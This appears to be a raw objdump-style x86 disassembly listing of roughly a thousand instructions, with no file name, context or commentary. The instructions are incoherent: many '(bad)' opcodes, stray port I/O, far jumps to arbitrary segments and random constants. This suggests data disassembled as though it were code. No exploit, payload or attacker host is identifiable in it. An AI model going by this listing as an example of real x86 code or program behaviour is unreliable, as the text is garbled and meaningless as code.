  4905cc:	mov    cl,BYTE PTR [ebp*4+0x759fbf60]
  4905d3:	adc    edx,0x54
  4905d6:	xchg   DWORD PTR [esi+0x15],edx
  4905d9:	mov    al,0x2a
  4905db:	xor    al,0xdf
  4905dd:	mov    bh,0xd0
  4905df:	lods   eax,DWORD PTR ds:[esi]
  4905e0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4905e1:	inc    edx
  4905e2:	and    esi,0x6c
  4905e5:	inc    eax
  4905e6:	test   al,0x52
  4905e8:	xchg   edi,eax
  4905e9:	mov    bl,0x20
  4905eb:	push   ss
  4905ec:	(bad)  
  4905ed:	and    eax,0x742b17bf
  4905f2:	add    bh,BYTE PTR [eax]
  4905f4:	inc    esp
  4905f5:	mul    DWORD PTR [eax-0x5b]
  4905f8:	sbb    BYTE PTR [edi+0x615f9a77],dl
  4905fe:	xchg   ebp,eax
  4905ff:	mov    ch,0x28
  490601:	scas   eax,DWORD PTR es:[edi]
  490602:	xchg   DWORD PTR [eax+0x3bd3b534],edi
  490608:	xor    DWORD PTR [edi+0x38],edi
  49060b:	daa    
  49060c:	mov    ds:0x27051585,al
  490611:	push   ss
  490612:	cmp    edx,ebx
  490614:	push   0x57
  490616:	(bad)  
  490617:	xor    eax,0x182b5f2f
  49061c:	lods   al,BYTE PTR ds:[esi]
  49061d:	add    BYTE PTR [edi-0x71],0x69
  490621:	fistp  WORD PTR [eax]
  490623:	add    eax,0xcd27d75f
  490628:	(bad)  
  490629:	call   0xada:0x9f2f021e
  490630:	and    eax,0x3300345f
  490635:	adc    dl,BYTE PTR [esi+0x7]
  490638:	mov    al,0xd7
  49063a:	xchg   DWORD PTR [ecx],eax
  49063c:	inc    ebx
  49063d:	xlat   BYTE PTR ds:[ebx]
  49063e:	push   0x6f
  490640:	aaa    
  490641:	xor    eax,0x81a8255a
  490646:	dec    edi
  490647:	inc    esp
  490648:	not    DWORD PTR [ebx+0xa]
  49064b:	xor    DWORD PTR [eax+0x72848147],ecx
  490651:	xor    edi,edi
  490653:	inc    esi
  490654:	sbb    bl,cl
  490656:	mov    bh,0xb6
  490658:	pop    ds
  490659:	outs   dx,DWORD PTR ds:[esi]
  49065a:	pop    ss
  49065b:	aaa    
  49065c:	pop    edx
  49065d:	sbb    ebp,DWORD PTR [eax]
  49065f:	lock and eax,DWORD PTR [ebx-0x11]
  490663:	inc    ebx
  490664:	pop    ds
  490665:	sub    eax,0x3701ac10
  49066a:	outs   dx,DWORD PTR ds:[esi]
  49066b:	jmp    DWORD PTR [edx+0x6b84d634]
  490671:	lahf   
  490672:	leave  
  490673:	mov    al,0xd
  490675:	pop    ebx
  490676:	dec    edi
  490677:	inc    edi
  490678:	pop    ss
  490679:	cmp    BYTE PTR [esi+0x34725c81],ah
  49067f:	xor    BYTE PTR [ebx-0x4e6b55be],cl
  490685:	mov    edi,0xac01275a
  49068a:	jecxz  0x4906c3
  49068c:	sub    DWORD PTR [ebx+0x61],0x143bfcd
  490693:	les    esp,FWORD PTR [eax]
  490695:	add    BYTE PTR [edi-0x49],dl
  490698:	mov    ebx,DWORD PTR [edx+0x31]
  49069b:	push   edi
  49069c:	out    dx,eax
  49069d:	jg     0x4906e2
  49069f:	sub    esi,DWORD PTR [esp+ecx*4]
  4906a2:	dec    ebx
  4906a3:	sub    al,BYTE PTR [ebp-0x18c816eb]
  4906a9:	scas   eax,DWORD PTR es:[edi]
  4906aa:	xor    al,0x6
  4906ac:	mov    bh,0x94
  4906ae:	mov    bh,0xc5
  4906b0:	and    eax,0x678f5d63
  4906b5:	lods   eax,DWORD PTR ds:[esi]
  4906b6:	pop    ecx
  4906b7:	fsubr  DWORD PTR [ebp-0x79bee861]
  4906bd:	xchg   ebx,eax
  4906be:	ss pop edi
  4906c0:	inc    ebx
  4906c1:	xchg   esp,eax
  4906c2:	mov    edx,0x36a7aba5
  4906c7:	pop    ds
  4906c8:	sub    ecx,DWORD PTR [esi]
  4906ca:	sub    al,0x34
  4906cc:	(bad)  
  4906cd:	mov    bh,0x84
  4906cf:	xor    eax,0x305b1a02
  4906d4:	sub    ch,BYTE PTR ds:0x58f78fec
  4906da:	shr    BYTE PTR [esp+ebx*1],0x76
  4906de:	daa    
  4906df:	add    DWORD PTR [ecx+0x57533803],ebp
  4906e5:	mov    DWORD PTR [ecx+0x76f1560],eax
  4906eb:	inc    ebx
  4906ec:	leave  
  4906ed:	mov    WORD PTR [edx-0x6b],ds
  4906f0:	aaa    
  4906f1:	outs   dx,DWORD PTR ds:[esi]
  4906f2:	xor    ebx,DWORD PTR [edx]
  4906f4:	(bad)  
  4906f5:	sub    DWORD PTR [ecx-0x31],esp
  4906f8:	scas   eax,DWORD PTR es:[edi]
  4906f9:	pop    es
  4906fa:	xchg   ecx,eax
  4906fb:	popa   
  4906fc:	lods   al,BYTE PTR ds:[esi]
  4906fd:	jg     0x490732
  4906ff:	adc    ebp,0xd2671228
  490705:	add    BYTE PTR [ebp+0x46065718],cl
  49070b:	xchg   ebp,eax
  49070c:	dec    edx
  49070d:	lds    ebx,FWORD PTR [edx-0x21]
  490710:	pop    ds
  490711:	xor    eax,0xe78028b5
  490716:	xchg   edi,eax
  490717:	push   ecx
  490718:	xor    DWORD PTR [eax+0x27428705],esi
  49071e:	pop    eax
  49071f:	dec    ecx
  490720:	jl     0x490785
  490722:	or     edi,DWORD PTR [edi+0xa]
  490725:	in     al,0x64
  490727:	mov    ds:0xa5433727,al
  49072c:	push   ss
  49072d:	(bad)  
  49072e:	rcr    BYTE PTR [edi+0x338a28f],0x5b
  490735:	test   DWORD PTR [esi+0x17],0x43508ab
  49073c:	lahf   
  49073d:	pop    ss
  49073e:	push   ss
  49073f:	mov    esp,0x35774dc9
  490744:	fwait
  490745:	mul    DWORD PTR [ecx-0xdc3d63]
  49074b:	aas    
  49074c:	(bad)  
  49074d:	or     eax,0x2c77560
  490752:	fild   QWORD PTR [esi-0x53]
  490755:	or     eax,ebx
  490757:	outs   dx,DWORD PTR ds:[esi]
  490758:	scas   eax,DWORD PTR es:[edi]
  490759:	dec    edi
  49075a:	pop    esp
  49075b:	and    BYTE PTR ds:0x428f73d2,ch
  490761:	sub    ch,BYTE PTR [ecx]
  490763:	inc    ebp
  490764:	or     al,0x9f
  490766:	pop    ds
  490767:	fidivr WORD PTR [edx+0x4766d78c]
  49076d:	ja     0x490790
  49076f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  490770:	inc    edx
  490771:	or     eax,ebx
  490773:	out    dx,eax
  490774:	(bad)  
  490775:	lds    eax,FWORD PTR [esi-0x3b0880ba]
  49077b:	mov    ecx,0x4f1ad8e4
  490780:	cmp    BYTE PTR [edx+ecx*4],dh
  490783:	mov    ch,0x8b
  490785:	add    eax,DWORD PTR [edi+0x42175738]
  49078b:	stos   BYTE PTR es:[edi],al
  49078c:	jne    0x49073e
  49078e:	iret   
  49078f:	xchg   edi,eax
  490790:	cmp    ah,BYTE PTR [ebp+0xc]
  490793:	sub    DWORD PTR [edx],ebx
  490795:	cmp    DWORD PTR [esi+0x42132443],ecx
  49079b:	dec    ebx
  49079c:	push   edi
  49079d:	xor    eax,0xc11c86c0
  4907a2:	xor    cl,BYTE PTR [edi-0x39ceb0cb]
  4907a8:	mov    al,ds:0xa62f33c9
  4907ad:	mov    ebx,0x42c92d08
  4907b2:	mov    edi,0xf6b27a7
  4907b7:	lahf   
  4907b8:	pop    edx
  4907b9:	aaa    
  4907ba:	out    0x2f,eax
  4907bc:	add    ebx,DWORD PTR [edx]
  4907be:	sti    
  4907bf:	dec    esi
  4907c0:	sahf   
  4907c1:	stos   DWORD PTR es:[edi],eax
  4907c2:	cmp    DWORD PTR [edi+0x5e],eax
  4907c5:	or     dl,BYTE PTR [edx-0x50]
  4907c8:	adc    esi,DWORD PTR [edi]
  4907ca:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4907cb:	add    ebx,edx
  4907cd:	ins    BYTE PTR es:[edi],dx
  4907ce:	sub    al,0xb4
  4907d0:	mov    esi,DWORD PTR [edi+0x1b]
  4907d3:	mov    cl,0x92
  4907d5:	and    esp,DWORD PTR [edi]
  4907d7:	xor    al,0x3
  4907d9:	inc    esp
  4907da:	jmp    0x6dab:0x17378910
  4907e1:	lods   eax,DWORD PTR ds:[esi]
  4907e2:	add    al,bh
  4907e4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4907e5:	inc    edx
  4907e6:	rol    BYTE PTR [edx+0x4dc74705],0x63
  4907ed:	or     eax,0xa4bfbf83
  4907f2:	push   ss
  4907f3:	ret    0x5fd8
  4907f6:	clflush BYTE PTR [ebp+0x60]
  4907fa:	bound  ebp,QWORD PTR [edi+0x36]
  4907fd:	out    dx,eax
  4907fe:	pop    ss
  4907ff:	xor    al,0x4b
  490801:	ficom  DWORD PTR [edx+0x345e304b]
  490807:	add    ebp,DWORD PTR [ebx-0x38e896b5]
  49080d:	add    DWORD PTR [edi],ebx
  49080f:	sub    edi,DWORD PTR [esi-0x65]
  490812:	inc    ebp
  490813:	daa    
  490814:	pop    ds
  490815:	push   ecx
  490816:	jmp    0x63de:0x8fafb130
  49081d:	push   ecx
  49081e:	test   eax,0x26e73649
  490823:	pop    ecx
  490824:	mov    esi,DWORD PTR [ebp+0x582f0b13]
  49082a:	or     eax,0x916fb080
  49082f:	adc    DWORD PTR [ebp-0x67],0x84211313
  490836:	cs pusha 
  490838:	ja     0x490895
  49083a:	sbb    al,0xd6
  49083c:	stos   BYTE PTR es:[edi],al
  49083d:	dec    edi
  49083e:	ja     0x4908af
  490840:	xor    DWORD PTR [ecx+esi*4-0x7090d569],eax
  490847:	and    edx,DWORD PTR [edx+ecx*1+0x57]
  49084b:	xor    eax,0x62b63857
  490850:	jmp    0x4556:0x43c7df23
  490857:	add    DWORD PTR [ebx],ebp
  490859:	xlat   BYTE PTR ds:[ebx]
  49085a:	mov    edi,0x8810568
  49085f:	push   DWORD PTR [edi]
  490861:	add    BYTE PTR [edx+ebp*1+0x3337ca38],cl
  490868:	mov    eax,ds:0xdf1f8101
  49086d:	or     eax,0x351c40ab
  490872:	inc    edi
  490873:	aas    
  490874:	adc    eax,0x6762e9e1
  490879:	das    
  49087a:	daa    
  49087b:	mov    DWORD PTR [ebp+0x10],ebp
  49087e:	shl    DWORD PTR ds:0xd1c46f8f,0x5b
  490885:	adc    DWORD PTR [edi],edx
  490887:	iret   
  490888:	pop    ss
  490889:	push   0x43
  49088b:	test   eax,0xe47f8fca
  490890:	pusha  
  490891:	push   ebx
  490892:	mov    ah,0x47
  490894:	xor    eax,DWORD PTR [edi+0x42]
  490897:	lods   eax,DWORD PTR ds:[esi]
  490898:	loopne 0x49089c
  49089a:	mov    ecx,0x16b73430
  49089f:	daa    
  4908a0:	mov    BYTE PTR [edi+eiz*4],dl
  4908a3:	push   edi
  4908a4:	jbe    0x490903
  4908a6:	(bad)  
  4908a7:	xor    esp,DWORD PTR [edi-0x61]
  4908aa:	xor    al,0x17
  4908ac:	fs fcom st(6)
  4908af:	mov    ah,0xb7
  4908b1:	psubq  mm1,QWORD PTR [eax]
  4908b4:	adc    DWORD PTR [eax+0x1a],edx
  4908b7:	scas   ax,WORD PTR es:[edi]
  4908b9:	aad    0x20
  4908bb:	add    ch,BYTE PTR [ebx+0x5a114f17]
  4908c1:	and    DWORD PTR [edi+esi*8-0x1cc39d3e],ebp
  4908c8:	xchg   edi,eax
  4908c9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4908ca:	daa    
  4908cb:	cmp    eax,0x1bdd4a5b
  4908d0:	aas    
  4908d1:	rcl    BYTE PTR [ecx],0x56
  4908d4:	gs not edi
  4908d7:	rol    DWORD PTR [eax],0x83
  4908da:	adc    dl,BYTE PTR [edi-0x427690a6]
  4908e0:	mov    al,ds:0xa22f8a15
  4908e5:	dec    edi
  4908e6:	and    DWORD PTR [ebp+0x3f],ebx
  4908e9:	aaa    
  4908ea:	outs   dx,DWORD PTR ds:[esi]
  4908eb:	test   BYTE PTR es:[esi+0x67a73165],ah
  4908f2:	push   ebx
  4908f3:	jmp    0xff80d0c8
  4908f8:	test   ecx,ecx
  4908fa:	shl    BYTE PTR [esi],0xc7
  4908fd:	push   edi
  4908fe:	cmp    BYTE PTR [eax-0x4c7164ff],dh
  490904:	pop    es
  490905:	inc    ebx
  490906:	sar    DWORD PTR [edx],0x12
  490909:	pop    es
  49090a:	mov    bl,0x1f
  49090c:	addr16 aam 0x2e
  49090f:	sbb    al,0x46
  490911:	ss aas 
  490913:	xchg   edi,eax
  490914:	sbb    al,0x60
  490916:	popf   
  490917:	push   edi
  490918:	outs   dx,BYTE PTR ds:[esi]
  490919:	xor    al,0x33
  49091b:	and    eax,0x5700aec7
  490920:	xor    dl,BYTE PTR [edi]
  490922:	xor    al,0xb8
  490924:	dec    ebx
  490925:	push   0xa67f43c9
  49092a:	mov    ah,0xaa
  49092c:	je     0x4908b7
  49092e:	outs   dx,DWORD PTR ds:[esi]
  49092f:	aaa    
  490930:	mov    al,0x61
  490932:	xlat   BYTE PTR ds:[ebx]
  490933:	add    eax,0xa22f8337
  490938:	and    DWORD PTR [ebp-0x4e],edx
  49093b:	addr16 inc edi
  49093d:	test   BYTE PTR [edi+0x677f464d],ah
  490943:	lods   eax,DWORD PTR ds:[esi]
  490944:	dec    ecx
  490945:	push   eax
  490946:	or     dl,BYTE PTR [edi]
  490948:	das    
  490949:	adc    BYTE PTR [edx],cl
  49094b:	or     al,0x9a
  49094d:	pop    ss
  49094e:	xor    eax,0x48d28e7
  490953:	scas   al,BYTE PTR es:[edi]
  490954:	outs   dx,DWORD PTR ds:[esi]
  490955:	inc    esp
  490956:	xchg   DWORD PTR [edx+0x1f0d568e],ebp
  49095c:	aas    
  49095d:	iret   
  49095e:	enter  0x82b1,0xc1
  490962:	(bad)  
  490963:	pop    es
  490964:	pop    ss
  490965:	rol    DWORD PTR [esi+0x59],0x38
  490969:	mov    ds:0x6c76efb7,eax
  49096e:	and    BYTE PTR [esi],dl
  490970:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  490971:	inc    edi
  490972:	push   ecx
  490973:	dec    edx
  490974:	push   ds
  490975:	cmc    
  490976:	xchg   DWORD PTR [esi],eax
  490978:	ss pop ss
  49097a:	mov    dl,0xcd
  49097c:	add    BYTE PTR [edx+0x5f],al
  49097f:	ja     0x490959
  490981:	push   esi
  490982:	lods   eax,DWORD PTR ds:[esi]
  490983:	mov    al,0xd7
  490985:	pop    es
  490986:	lahf   
  490987:	sub    eax,ecx
  490989:	or     BYTE PTR [ebx-0x49],ch
  49098c:	stos   DWORD PTR es:[edi],eax
  49098d:	sar    BYTE PTR [eax],0xd6
  490990:	push   esi
  490991:	addr16 inc edi
  490993:	daa    
  490994:	dec    eax
  490995:	jo     0x490a01
  490997:	jns    0x4909df
  490999:	xor    al,0x17
  49099b:	xor    dh,al
  49099d:	mov    ch,0x1
  49099f:	pop    DWORD PTR [edi+0x6e]
  4909a2:	sub    ecx,DWORD PTR [edx+0x1c]
  4909a5:	xchg   edi,eax
  4909a6:	pop    es
  4909a7:	add    eax,DWORD PTR [edi+ebx*8+0x18]
  4909ab:	inc    ebp
  4909ac:	ja     0x4909d8
  4909ae:	inc    edi
  4909af:	mov    bh,0x26
  4909b1:	push   cs
  4909b2:	inc    edx
  4909b3:	inc    ecx
  4909b4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4909b5:	cmp    BYTE PTR [ebp-0x50bf53fa],al
  4909bb:	lahf   
  4909bc:	pusha  
  4909bd:	stos   DWORD PTR es:[edi],eax
  4909be:	mov    ch,0x75
  4909c0:	aas    
  4909c1:	idiv   DWORD PTR [edx+0x117336e7]
  4909c7:	xor    eax,0x925734df
  4909cc:	xchg   ebx,eax
  4909cd:	add    esi,esi
  4909cf:	outs   dx,DWORD PTR ds:[esi]
  4909d0:	push   edi
  4909d1:	inc    esp
  4909d2:	cmp    BYTE PTR [esi+0x42],cl
  4909d5:	or     esp,esp
  4909d7:	xor    al,0x2f
  4909d9:	adc    al,0x42
  4909db:	pop    edx
  4909dc:	mov    ch,0x37
  4909de:	and    eax,DWORD PTR [ecx]
  4909e0:	or     al,0x28
  4909e2:	mov    WORD PTR [edi-0x73],ds
  4909e5:	sub    DWORD PTR [ebp+0xb],0xfffffff3
  4909e9:	mov    bh,0x9f
  4909eb:	inc    ebx
  4909ec:	nop
  4909ed:	and    DWORD PTR [eax-0x7f],ecx
  4909f0:	aas    
  4909f1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4909f2:	cmp    BYTE PTR ds:0x1f2c010b,al
  4909f8:	pop    es
  4909f9:	push   0x37627631
  4909fe:	(bad)  
  490a00:	or     al,0x21
  490a02:	push   esp
  490a03:	outs   dx,DWORD PTR ds:[esi]
  490a04:	(bad)  
  490a05:	ss dec esp
  490a07:	stos   DWORD PTR es:[edi],eax
  490a08:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  490a09:	and    ah,BYTE PTR [edi+0x17]
  490a0c:	push   cs
  490a0d:	call   0xf407912c
  490a12:	xchg   edi,eax
  490a13:	adc    ebp,DWORD PTR [ecx]
  490a15:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  490a16:	xchg   BYTE PTR [ecx+0x7],al
  490a19:	ins    DWORD PTR es:[edi],dx
  490a1a:	xlat   BYTE PTR ds:[ebx]
  490a1b:	add    BYTE PTR [ebp+0x773737bf],ch
  490a21:	inc    edx
  490a22:	inc    ecx
  490a23:	stos   DWORD PTR es:[edi],eax
  490a24:	or     bh,al
  490a26:	mov    edi,0xdd0254bd
  490a2b:	adc    eax,DWORD PTR [ecx-0x49]
  490a2e:	iret   
  490a2f:	xor    eax,0x378db10e
  490a34:	pop    ss
  490a35:	mul    DWORD PTR [edi+0x2b]
  490a38:	xor    BYTE PTR [ecx-0x3a38d093],cl
  490a3e:	pop    eax
  490a3f:	and    eax,0x7f27b76d
  490a44:	xchg   ebx,eax
  490a45:	mov    ecx,0x429f2a6e
  490a4a:	pop    ds
  490a4b:	mov    al,0x5d
  490a4d:	call   0xd778f5bc
  490a52:	dec    edx
  490a53:	sub    bl,BYTE PTR [ebp+0x16]
  490a56:	sub    edi,DWORD PTR [edi]
  490a58:	xor    ebp,ebp
  490a5a:	adc    dh,BYTE PTR [ecx]
  490a5c:	pop    es
  490a5d:	xchg   edi,eax
  490a5e:	xor    bl,BYTE PTR [eax]
  490a60:	ret    
  490a61:	bound  edx,QWORD PTR [ecx-0x41]
  490a64:	xchg   eax,ebx
  490a66:	push   esi
  490a67:	push   eax
  490a68:	pop    es
  490a69:	adc    ebx,DWORD PTR [edi-0x45d4e6e1]
  490a6f:	sub    eax,0x27412fbf
  490a74:	push   cs
  490a75:	imul   eax,DWORD PTR [edi+edx*1],0xd77f427b
  490a7c:	sbb    dh,BYTE PTR [eax+0x6f]
  490a7f:	cmp    DWORD PTR [ebx],esi
  490a81:	mov    edi,DWORD PTR [esi]
  490a83:	ja     0x490a33
  490a85:	sbb    esp,edi
  490a87:	fsub   DWORD PTR [edi]
  490a89:	xor    bh,cl
  490a8b:	cmp    BYTE PTR [ecx-0x60792ade],ah
  490a91:	mov    edi,0x1762255
  490a96:	aas    
  490a97:	aas    
  490a98:	xchg   ecx,eax
  490a99:	push   ss
  490a9a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  490a9b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  490a9c:	xchg   edi,eax
  490a9d:	fbld   TBYTE PTR [ecx+0x37]
  490aa0:	mov    dl,0x77
  490aa2:	xor    bh,BYTE PTR [edi-0x9]
  490aa5:	dec    edi
  490aa6:	or     BYTE PTR [edx+eax*4+0x7e],bl
  490aaa:	pop    ds
  490aab:	xor    DWORD PTR [edi-0x2eca9c54],ebx
  490ab1:	jg     0x490aba
  490ab3:	nop
  490ab4:	push   esi
  490ab5:	popa   
  490ab6:	je     0x490b17
  490ab8:	dec    DWORD PTR [eax]
  490aba:	pop    eax
  490abb:	and    eax,0x97378fae
  490ac0:	inc    ecx
  490ac1:	imul   edx,DWORD PTR [edx-0x7280c88a],0x4a5b4a0d
  490acb:	das    
  490acc:	sub    esi,DWORD PTR [eax+0x47c6d89b]
  490ad2:	aaa    
  490ad3:	out    dx,eax
  490ad4:	(bad)  
  490ad5:	or     dh,BYTE PTR [eax-0x10]
  490ad8:	(bad)  
  490ada:	pop    ds
  490adb:	sbb    eax,0xdfa0da52
  490ae0:	aaa    
  490ae1:	(bad)  
  490ae2:	(bad)  
  490ae3:	adc    eax,0xa7ff5a40
  490ae8:	inc    ebp
  490ae9:	aaa    
  490aea:	ror    BYTE PTR [eax+0x2a403fd7],cl
  490af0:	shl    DWORD PTR [eax+0x4a0c0727],0x52
  490af7:	into   
  490af8:	xor    eax,0x864d3927
  490afd:	imul   ecx,DWORD PTR ds:0xb5372f0f,0x60
  490b04:	lds    eax,FWORD PTR [eax-0x49]
  490b07:	lahf   
  490b08:	mov    esp,0xf746009d
  490b0d:	out    dx,eax
  490b0e:	and    DWORD PTR ds:0x7202891,0x4f
  490b15:	nop
  490b16:	cwde   
  490b17:	ins    DWORD PTR es:[edi],dx
  490b18:	loop   0x490b4f
  490b1a:	push   edi
  490b1b:	jne    0x490b7e
  490b1d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  490b1e:	gs aaa 
  490b20:	(bad)  
  490b21:	jg     0x490b39
  490b23:	enter  0x8f05,0xca
  490b27:	ss ins BYTE PTR es:[di],dx
  490b2a:	leave  
  490b2b:	push   ecx
  490b2c:	sub    al,0x7a
  490b2e:	addr16 ss das 
  490b31:	pop    esp
  490b32:	mov    ah,dl
  490b34:	dec    esp
  490b35:	xor    eax,0x4ab18e6f
  490b3a:	pusha  
  490b3b:	push   eax
  490b3c:	outs   dx,DWORD PTR ds:[esi]
  490b3d:	(bad)  
  490b3e:	sub    al,0x34
  490b40:	sbb    bl,BYTE PTR [eax+0x47]
  490b43:	pop    ss
  490b44:	xlat   BYTE PTR ds:[ebx]
  490b45:	mov    BYTE PTR [edx+0x2b],al
  490b48:	(bad)  
  490b49:	xor    BYTE PTR [edi+0x2dc5118f],ah
  490b4f:	sbb    dh,BYTE PTR [eax]
  490b51:	(bad)  
  490b52:	mov    esi,0x56042367
  490b57:	mov    eax,ds:0x4ac76fd7
  490b5c:	jmp    0x490ba1
  490b5e:	jg     0x490bcf
  490b60:	daa    
  490b61:	add    al,0x46
  490b63:	shr    DWORD PTR [edx],0x6e
  490b66:	daa    
  490b67:	mov    dh,0x42
  490b69:	adc    DWORD PTR [edx],0x7
  490b6c:	inc    edi
  490b6d:	(bad)  
  490b6e:	sub    al,0x63
  490b70:	ffree  st(0)
  490b72:	inc    edi
  490b73:	mov    edx,0xffd823a5
  490b78:	xchg   DWORD PTR [esi],esi
  490b7a:	daa    
  490b7b:	stos   DWORD PTR es:[edi],eax
  490b7c:	(bad)  
  490b7d:	pusha  
  490b7e:	inc    esi
  490b7f:	scas   eax,DWORD PTR es:[edi]
  490b80:	jg     0x490bc2
  490b82:	or     al,0x4c
  490b84:	add    al,0x27
  490b86:	aaa    
  490b87:	inc    edi
  490b88:	and    eax,0x35ca4c48
  490b8d:	aaa    
  490b8e:	outs   dx,DWORD PTR ds:[esi]
  490b8f:	ins    DWORD PTR es:[edi],dx
  490b90:	stos   DWORD PTR es:[edi],eax
  490b91:	add    dh,BYTE PTR [eax+0x16e74f87]
  490b97:	xlat   BYTE PTR ds:[ebx]
  490b98:	mov    dh,0x4e
  490b9a:	iret   
  490b9b:	pop    ds
  490b9c:	aas    
  490b9d:	inc    esp
  490b9e:	ins    BYTE PTR es:[edi],dx
  490b9f:	or     BYTE PTR [ebx],ch
  490ba1:	xchg   edi,eax
  490ba2:	daa    
  490ba3:	push   edx
  490ba4:	les    ebp,FWORD PTR [edx+0x6d557ac]
  490baa:	jbe    0x490b38
  490bac:	aas    
  490bad:	add    esp,DWORD PTR [edi+0x2ab0d6b3]
  490bb3:	pop    ss
  490bb4:	pop    es
  490bb5:	shrd   DWORD PTR [eax],ebx,0x38
  490bb9:	bound  edi,QWORD PTR [edx-0x39]
  490bbc:	add    ecx,DWORD PTR [ebx]
  490bbe:	or     eax,DWORD PTR [ecx]
  490bc0:	addr16 aaa 
  490bc2:	mov    ds:0x8f88c181,eax
  490bc7:	push   edi
  490bc8:	ret    
  490bc9:	dec    esi
  490bca:	pop    ebp
  490bcb:	popa   
  490bcc:	iret   
  490bcd:	jg     0x490c21
  490bcf:	push   ebp
  490bd0:	add    dh,BYTE PTR [esi+eax*4-0x4e497cd1]
  490bd7:	imul   edx,DWORD PTR es:[edi-0x54afc9fc],0x47
  490bdf:	pop    edi
  490be0:	pop    esi
  490be1:	test   BYTE PTR [ecx-0x53],0x7f
  490be5:	mov    ebx,0xc3e80f7f
  490bea:	sar    BYTE PTR [edx],0x3f
  490bed:	push   edi
  490bee:	arpl   WORD PTR [eax+0x32b70828],di
  490bf4:	dec    edi
  490bf5:	imul   edx,DWORD PTR [ebp+0x17],0x5f071f78
  490bfc:	dec    edi
  490bfd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  490bfe:	rcl    dl,1
  490c00:	into   
  490c01:	addr16 inc edi
  490c03:	shr    BYTE PTR [ecx-0x2b],cl
  490c06:	mov    gs,WORD PTR [edi]
  490c08:	imul   esi,DWORD PTR [esi+0x4548186e],0xffffffe7
  490c0f:	fild   WORD PTR [eax]
  490c11:	stc    
  490c12:	adc    BYTE PTR [eax-0x2dfdb94a],dh
  490c18:	gs popa 
  490c1a:	inc    ebp
  490c1b:	ja     0x490bd3
  490c1d:	arpl   WORD PTR [edi-0x29],dx
  490c20:	pop    ss
  490c21:	repz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  490c23:	xor    DWORD PTR [edi],ebx
  490c25:	(bad)  [eax+0x17172160]
  490c2b:	and    edx,DWORD PTR [edi]
  490c2d:	inc    ecx
  490c2e:	jns    0x490bdc
  490c30:	arpl   WORD PTR [edi-0x21],bp
  490c33:	sub    cl,BYTE PTR [eax]
  490c35:	imul   edx,DWORD PTR [edi+0x57],0x38
  490c39:	dec    edi
  490c3a:	mov    bh,0xd6
  490c3c:	inc    esp
  490c3d:	ins    BYTE PTR es:[edi],dx
  490c3e:	(bad)  
  490c3f:	jg     0x490ca0
  490c41:	(bad)  
  490c42:	ins    DWORD PTR es:[edi],dx
  490c43:	nop
  490c44:	or     al,0x97
  490c46:	inc    edi
  490c47:	push   ds
  490c48:	xchg   BYTE PTR [edx+0x3],ah
  490c4b:	imul   edi,DWORD PTR [edi+0x701d41f7],0xffffffab
  490c52:	mov    al,ds:0x377e6777
  490c57:	push   ecx
  490c58:	add    esi,eax
  490c5a:	and    al,0x43
  490c5c:	inc    edi
  490c5d:	mov    eax,ds:0x6720ab13
  490c62:	lahf   
  490c63:	sbb    BYTE PTR [ebx+0x4f39bc48],ch
  490c69:	das    
  490c6a:	push   esi
  490c6b:	or     DWORD PTR [eax+0x44ff2fb6],ebx
  490c71:	mov    edi,0x15290eb8
  490c76:	pop    edi
  490c77:	out    0x41,eax
  490c79:	xchg   ebp,eax
  490c7a:	and    BYTE PTR [ecx+0x59],dl
  490c7d:	daa    
  490c7e:	xchg   DWORD PTR [edx],eax
  490c80:	ins    BYTE PTR es:[edi],dx
  490c81:	xchg   BYTE PTR [eax+0x57],dh
  490c84:	out    0x47,eax
  490c86:	push   ss
  490c87:	sub    al,0x30
  490c89:	mov    ah,0x7f
  490c8b:	sbb    ebx,DWORD PTR [ebx-0x184bd7b9]
  490c91:	out    0xf7,eax
  490c93:	sub    ebx,DWORD PTR [edx+0x424b430e]
  490c99:	cvtps2pi mm4,QWORD PTR [ecx]
  490c9c:	push   edi
  490c9d:	push   eax
  490c9e:	iret   
  490c9f:	cmp    BYTE PTR [edi-0xf],ch
  490ca2:	lea    edx,[ebp+0x62]
  490ca5:	daa    
  490ca6:	sub    ebx,DWORD PTR [esi+0x1775a572]
  490cac:	ja     0x490cdf
  490cae:	push   edi
  490caf:	fisttp QWORD PTR [edx]
  490cb1:	test   DWORD PTR [edi+eiz*1],esi
  490cb4:	test   esi,0x9a835ab7
  490cba:	aas    
  490cbb:	pop    ss
  490cbc:	aaa    
  490cbd:	xchg   esi,eax
  490cbe:	or     al,0x7b
  490cc0:	jmp    0x490d11
  490cc2:	daa    
  490cc3:	push   edi
  490cc4:	xor    BYTE PTR [ebx-0x71],dh
  490cc7:	sbb    ch,ch
  490cc9:	into   
  490cca:	push   edi
  490ccb:	pop    ds
  490ccc:	pop    edi
  490ccd:	addr16 das 
  490ccf:	xor    al,0x9
  490cd1:	les    edi,FWORD PTR [edi-0x52ee9fe9]
  490cd7:	add    dl,BYTE PTR [edi-0x69]
  490cda:	(bad)  
  490cdb:	lods   eax,DWORD PTR ds:[esi]
  490cdc:	adc    ecx,edx
  490cde:	dec    esi
  490cdf:	aas    
  490ce0:	(bad)  
  490ce1:	data16 movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  490ce3:	sub    ax,0x5f36
  490ce7:	andps  xmm6,XMMWORD PTR [eax+0xd]
  490ceb:	lods   al,BYTE PTR ds:[esi]
  490cec:	out    0xa7,eax
  490cee:	push   ss
  490cef:	adc    DWORD PTR [esi-0x73],edx
  490cf2:	mov    bh,0x47
  490cf4:	and    eax,0xcf055847
  490cf9:	pop    esi
  490cfa:	xor    ch,BYTE PTR [edi+0x6d]
  490cfd:	adc    DWORD PTR [ecx],esp
  490cff:	das    
  490d00:	inc    edi
  490d01:	addr16 sub eax,edx
  490d04:	push   cs
